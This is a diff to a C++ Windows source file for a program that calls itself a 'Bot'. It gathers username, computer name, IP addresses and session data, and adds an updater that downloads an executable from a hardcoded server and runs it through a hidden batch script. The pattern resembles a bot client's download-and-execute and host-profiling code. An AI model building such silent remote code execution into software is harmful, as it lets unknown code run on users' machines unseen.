@@ -3,138 +3,272 @@
 #include <iostream>
 #include <cstdio>
 #include <lmcons.h>
+#include <sstream>
+#include <iomanip>
+#include <wininet.h>
+#include <fstream>
+#include <direct.h>
+#include <io.h>
+
+#pragma comment(lib, "wininet.lib")
+
+// Version information
+const std::string SystemInfo::VERSION = "1.0.0";
+const std::string SystemInfo::UPDATE_SERVER_URL = "http://192.168.1.100:8080/updates/";
 
 std::string SystemInfo::getSystemInformation() {
-    std::string info = "=== SYSTEM INFORMATION ===\n";
-    info += getBasicSystemInfo();
-    info += getMemoryInfo();
-    info += getTimeInfo();
-    info += getNetworkInfo();
-    info += getUserInfo();
-    info += "========================\n";
-    return info;
+    std::stringstream ss;
+    
+    ss << "=== SYSTEM INFORMATION ===" << std::endl;
+    ss << "Bot Version: " << VERSION << std::endl;
+    ss << getBasicSystemInfo();
+    ss << getNetworkInfo();
+    ss << getUserInfo();
+    ss << getMemoryInfo();
+    ss << getTimeInfo();
+    ss << "=========================" << std::endl;
+    
+    return ss.str();
+}
+
+std::string SystemInfo::getVersion() {
+    return VERSION;
+}
+
+std::string SystemInfo::getUpdateUrl() {
+    return UPDATE_SERVER_URL;
+}
+
+bool SystemInfo::checkForUpdates() {
+    try {
+        HINTERNET hInternet = InternetOpen("Bot Updater", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+        if (!hInternet) {
+            std::cerr << "Failed to initialize WinINet" << std::endl;
+            return false;
+        }
+        
+        std::string versionUrl = UPDATE_SERVER_URL + "version.txt";
+        HINTERNET hUrl = InternetOpenUrl(hInternet, versionUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+        
+        if (!hUrl) {
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+        
+        char buffer[256];
+        DWORD bytesRead;
+        std::string serverVersion;
+        
+        while (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
+            buffer[bytesRead] = 0;
+            serverVersion += buffer;
+        }
+        
+        InternetCloseHandle(hUrl);
+        InternetCloseHandle(hInternet);
+        
+        // Remove whitespace and newlines
+        serverVersion.erase(0, serverVersion.find_first_not_of(" \t\r\n"));
+        serverVersion.erase(serverVersion.find_last_not_of(" \t\r\n") + 1);
+        
+        std::cout << "Current version: " << VERSION << std::endl;
+        std::cout << "Server version: " << serverVersion << std::endl;
+        
+        return serverVersion != VERSION;
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Error checking for updates: " << e.what() << std::endl;
+        return false;
+    }
+}
+
+bool SystemInfo::downloadAndUpdate(const std::string& updateUrl) {
+    try {
+        std::cout << "Starting update process..." << std::endl;
+        
+        // Get current executable path
+        char exePath[MAX_PATH];
+        GetModuleFileName(NULL, exePath, MAX_PATH);
+        std::string currentExe = exePath;
+        
+        // Create temporary directory for update
+        char tempPath[MAX_PATH];
+        GetTempPath(MAX_PATH, tempPath);
+        std::string tempDir = std::string(tempPath) + "bot_update\\";
+        _mkdir(tempDir.c_str());
+        
+        std::string newExePath = tempDir + "modular_bot_new.exe";
+        std::string updaterPath = tempDir + "updater.exe";
+        
+        // Download new version
+        std::cout << "Downloading new version..." << std::endl;
+        if (!downloadFile(updateUrl, newExePath)) {
+            std::cerr << "Failed to download new version" << std::endl;
+            return false;
+        }
+        
+        // Create updater script
+        std::string updaterScript = tempDir + "update.bat";
+        std::ofstream script(updaterScript);
+        script << "@echo off\n";
+        script << "timeout /t 2 /nobreak > nul\n";
+        script << "copy \"" << newExePath << "\" \"" << currentExe << "\"\n";
+        script << "start \"\" \"" << currentExe << "\"\n";
+        script << "del \"" << updaterScript << "\"\n";
+        script << "rmdir /s /q \"" << tempDir << "\"\n";
+        script.close();
+        
+        // Execute updater
+        std::cout << "Installing update..." << std::endl;
+        ShellExecute(NULL, "open", updaterScript.c_str(), NULL, NULL, SW_HIDE);
+        
+        // Exit current process
+        std::cout << "Update initiated. Exiting..." << std::endl;
+        Sleep(1000);
+        exit(0);
+        
+        return true;
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Error during update: " << e.what() << std::endl;
+        return false;
+    }
+}
+
+bool SystemInfo::downloadFile(const std::string& url, const std::string& localPath) {
+    HINTERNET hInternet = InternetOpen("Bot Updater", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) {
+        return false;
+    }
+    
+    HINTERNET hUrl = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hUrl) {
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+    
+    std::ofstream file(localPath, std::ios::binary);
+    if (!file.is_open()) {
+        InternetCloseHandle(hUrl);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+    
+    char buffer[4096];
+    DWORD bytesRead;
+    
+    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        file.write(buffer, bytesRead);
+    }
+    
+    file.close();
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+    
+    return true;
 }
 
 std::string SystemInfo::getBasicSystemInfo() {
-    std::string info;
+    std::stringstream ss;
     
-    // Get username
-    char username[UNLEN + 1];
-    DWORD username_len = UNLEN + 1;
-    if (GetUserNameA(username, &username_len)) {
-        info += "Username: " + std::string(username) + "\n";
-    }
-    
-    // Get computer name
     char computerName[MAX_COMPUTERNAME_LENGTH + 1];
-    DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
-    if (GetComputerNameA(computerName, &computerName_len)) {
-        info += "Computer Name: " + std::string(computerName) + "\n";
-    }
+    DWORD size = sizeof(computerName);
+    GetComputerName(computerName, &size);
     
-    // Get Windows version
-    OSVERSIONINFOA osvi;
-    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
-    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
-    if (GetVersionExA(&osvi)) {
-        info += "Windows Version: " + std::to_string(osvi.dwMajorVersion) + "." + std::to_string(osvi.dwMinorVersion) + "\n";
-    }
+    char username[256];
+    DWORD usernameSize = sizeof(username);
+    GetUserName(username, &usernameSize);
     
-    // Get current directory
+    ss << "Username: " << username << std::endl;
+    ss << "Computer Name: " << computerName << std::endl;
+    
+    OSVERSIONINFO osvi;
+    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
+    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+    GetVersionEx(&osvi);
+    
+    ss << "Windows Version: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << std::endl;
+    
     char currentDir[MAX_PATH];
-    if (GetCurrentDirectoryA(MAX_PATH, currentDir)) {
-        info += "Current Directory: " + std::string(currentDir) + "\n";
-    }
+    GetCurrentDirectory(MAX_PATH, currentDir);
+    ss << "Current Directory: " << currentDir << std::endl;
     
-    // Get hostname
     char hostname[256];
     if (gethostname(hostname, sizeof(hostname)) == 0) {
-        info += "Hostname: " + std::string(hostname) + "\n";
+        ss << "Hostname: " << hostname << std::endl;
     }
     
-    return info;
-}
-
-std::string SystemInfo::getMemoryInfo() {
-    std::string info;
-    
-    MEMORYSTATUSEX memInfo;
-    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
-    if (GlobalMemoryStatusEx(&memInfo)) {
-        info += "Total RAM: " + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\n";
-        info += "Available RAM: " + std::to_string(memInfo.ullAvailPhys / (1024 * 1024)) + " MB\n";
-    }
-    
-    return info;
-}
-
-std::string SystemInfo::getTimeInfo() {
-    std::string info;
-    
-    SYSTEMTIME st;
-    GetLocalTime(&st);
-    char timeStr[64];
-    sprintf(timeStr, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
-    info += "System Time: " + std::string(timeStr) + "\n";
-    
-    return info;
+    return ss.str();
 }
 
 std::string SystemInfo::getNetworkInfo() {
-    std::string info = "=== NETWORK INTERFACES ===\n";
+    std::stringstream ss;
+    ss << "=== NETWORK INTERFACES ===" << std::endl;
     
-    // Get local IP addresses using socket
-    SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock != INVALID_SOCKET) {
-        struct sockaddr_in addr;
-        addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = inet_addr("8.8.8.8");
-        addr.sin_port = htons(53);
-        
-        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
-            int addr_len = sizeof(addr);
-            if (getsockname(sock, (struct sockaddr*)&addr, &addr_len) == 0) {
-                char localIP[16];
-                strcpy(localIP, inet_ntoa(addr.sin_addr));
-                info += "Primary IP: " + std::string(localIP) + "\n";
-            }
-        }
-        closesocket(sock);
-    }
-    
-    // Get additional network info
     char hostname[256];
     if (gethostname(hostname, sizeof(hostname)) == 0) {
         struct hostent* host = gethostbyname(hostname);
         if (host != NULL) {
-            for (int i = 0; host->h_addr_list[i] != NULL; i++) {
-                struct in_addr addr;
-                addr.s_addr = *(u_long*)host->h_addr_list[i];
-                char ipStr[16];
-                strcpy(ipStr, inet_ntoa(addr));
-                info += "Network IP " + std::to_string(i+1) + ": " + std::string(ipStr) + "\n";
+            char* primaryIP = inet_ntoa(*(struct in_addr*)host->h_addr_list[0]);
+            ss << "Primary IP: " << primaryIP << std::endl;
+            
+            // Get additional network interfaces
+            int interfaceCount = 0;
+            for (int i = 1; host->h_addr_list[i] != NULL; i++) {
+                char* ip = inet_ntoa(*(struct in_addr*)host->h_addr_list[i]);
+                ss << "Network IP " << ++interfaceCount << ": " << ip << std::endl;
             }
         }
     }
     
-    return info;
+    return ss.str();
 }
 
 std::string SystemInfo::getUserInfo() {
-    std::string info = "=== USER INFO ===\n";
+    std::stringstream ss;
+    ss << "=== USER INFO ===" << std::endl;
     
-    char userName[UNLEN + 1];
-    DWORD userNameLen = UNLEN + 1;
+    char username[256];
+    DWORD usernameSize = sizeof(username);
+    GetUserName(username, &usernameSize);
+    ss << "Current User: " << username << std::endl;
     
-    if (GetUserNameA(userName, &userNameLen)) {
-        info += "Current User: " + std::string(userName) + "\n";
-    }
-    
-    // Get session information
     DWORD sessionId;
     if (ProcessIdToSessionId(GetCurrentProcessId(), &sessionId)) {
-        info += "Session ID: " + std::to_string(sessionId) + "\n";
+        ss << "Session ID: " << sessionId << std::endl;
     }
     
-    return info;
+    return ss.str();
+}
+
+std::string SystemInfo::getMemoryInfo() {
+    std::stringstream ss;
+    
+    MEMORYSTATUSEX memInfo;
+    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+    GlobalMemoryStatusEx(&memInfo);
+    
+    DWORDLONG totalPhysMem = memInfo.ullTotalPhys;
+    DWORDLONG availPhysMem = memInfo.ullAvailPhys;
+    
+    ss << "Total RAM: " << (totalPhysMem / (1024 * 1024)) << " MB" << std::endl;
+    ss << "Available RAM: " << (availPhysMem / (1024 * 1024)) << " MB" << std::endl;
+    
+    return ss.str();
+}
+
+std::string SystemInfo::getTimeInfo() {
+    std::stringstream ss;
+    
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    
+    ss << "System Time: " << st.wYear << "-" 
+       << std::setfill('0') << std::setw(2) << st.wMonth << "-"
+       << std::setfill('0') << std::setw(2) << st.wDay << " "
+       << std::setfill('0') << std::setw(2) << st.wHour << ":"
+       << std::setfill('0') << std::setw(2) << st.wMinute << ":"
+       << std::setfill('0') << std::setw(2) << st.wSecond << std::endl;
+    
+    return ss.str();
 } 
